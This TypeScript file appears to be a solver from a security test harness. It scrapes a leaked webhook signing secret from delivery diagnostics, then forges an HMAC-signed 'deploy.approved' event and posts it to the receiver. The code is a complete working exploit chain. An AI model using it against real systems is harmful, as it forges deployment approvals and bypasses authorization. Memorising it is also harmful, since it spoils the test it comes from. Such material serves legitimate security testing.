// Two-step webhook attempt: read the failed-delivery diagnostics for the workspace signing material,
// then sign a deployment-approval event with it and post the event to the receiver.
import { createHmac } from 'node:crypto'
import type { SolverCtx } from '../../../../lib/types.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const list = ctx.plan.routes['webhooks.list']
  const deliveries = ctx.plan.routes['webhooks.deliveries']
  const receive = ctx.plan.routes['webhooks.receive']
  if (!list || !deliveries || !receive) return
  const headers = await ctx.login('member_a')
  const hooks = await ctx.request({ method: list.method, path: list.path, headers })
  const hookId = hooks.json<{ items?: Array<{ id?: string }> }>().items?.[0]?.id
  if (!hookId) return
  const historyPath = deliveries.path.replace(/:[^/]+/, encodeURIComponent(hookId))
  const history = await ctx.request({ method: deliveries.method, path: historyPath, headers })
  const text = history.body
  const salt = text.match(/rbs_[a-z0-9]+_[0-9a-f]{12}/)?.[0] ?? 'rbs_unknown_000000000000'
  const body = { webhookId: hookId, event: 'deploy.approved' }
  const canonical = JSON.stringify(body)
  const timestamp = String(Math.floor(Date.now() / 1000))
  const signature = createHmac('sha256', salt).update(`${timestamp}.${canonical}`).digest('hex')
  await ctx.request({
    method: receive.method,
    path: receive.path,
    headers: { ...headers, 'content-type': 'application/json', 'x-timestamp': timestamp, 'x-signature': signature },
    body,
  })
}
